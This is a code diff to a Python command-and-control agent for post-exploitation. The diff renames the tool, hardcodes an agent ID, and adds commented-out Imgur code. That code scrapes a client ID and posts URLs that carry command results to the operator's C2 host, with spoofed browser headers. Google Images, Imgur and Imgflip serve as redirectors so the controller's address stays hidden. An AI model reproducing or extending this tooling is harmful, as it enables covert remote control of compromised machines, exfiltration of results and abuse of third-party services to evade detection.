@@ -5,11 +5,11 @@ from pyzbar.pyzbar import decode
 
 beaconint = random.randint(0, 9)
 uuidval = (uuid.uuid1())
-agentid = str(uuidval)
-#agentid = 'e383694c-f9e0-11ea-a2fa-001a7dda7113'
+#agentid = str(uuidval)
+agentid = 'e383694c-f9e0-11ea-a2fa-001a7dda7113'
 
 ## Welcome Screen
-print('\r\n#########################################\r\nWelcome to the QR Post Exploit Agent! \r\n#########################################\r\n\r\n')
+print('\r\n#########################################\r\nWelcome to the QR C2 Agent! \r\n#########################################\r\n\r\n')
 
 print ('Please enter the domain or IP address of the C2 server. (Public, if not using a Direct Connection)\r\n')
 
@@ -23,11 +23,11 @@ port = input('#: ')
 
 host = ip_domain + ':' + port
 
-print ('\r\nChoose an exfil type below to get started.\r\n')
+print ('\r\nChoose a channel type below to get started. 2-4 are Redirectors and won\'t expose your domain/IP.\r\n')
 
 print ('1.\tDirect Connection (No Proxy/Redirector)')
 print ('2.\tGoogle Images')
-print ('3.\tImgur (Coming Soon!)')
+print ('3.\tImgur (POST Only!)')
 print ('4.\tImgflip (Rate Limited)\r\n')
 
 ## Function for Direct C2 Connection
@@ -105,7 +105,30 @@ def google(cmd,result):
 ## Function for Imgur Redirector    
 def imgur(cmd,result):
     print('Imgur support coming soon!')
+    #URL = 'https://s.imgur.com/desktop-assets/js/main.2866a7158e282cd60274.js'
+
+    #r = requests.get(url = URL)
     
+    #body = str(r.content)
+    
+    #m = re.search('concat\(i\),u=\"(.+?)\",c=\"', body)
+    #clientid = m.group(1) 
+    
+    #randval = (uuid.uuid1())
+    #cachebust = str(randval)
+    
+    ### Prepare Google Image Search to Use C2 Payload
+    #payload_url = 'http://' + host + '/img.png?id=' + agentid + '&name=Agent&result=' + result + '&rand=' + cachebust
+
+    #url2 = 'https://api.imgur.com/3/image'
+    #files = {'image': (None, payload_url),'type': (None, 'URL')}
+    #params = {'client_id':clientid}
+    #headervals = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36','Content-Type':'multipart/form-data;','Accept':'*/*','Origin':'https://imgur.com','Sec-Fetch-Site':'same-site','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://imgur.com/','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9'}
+
+    #x = requests.post(url2, files = files, headers = headervals, params = params)
+    
+    #print(x.content)
+
     return
     
 def imgflip(cmd,result):
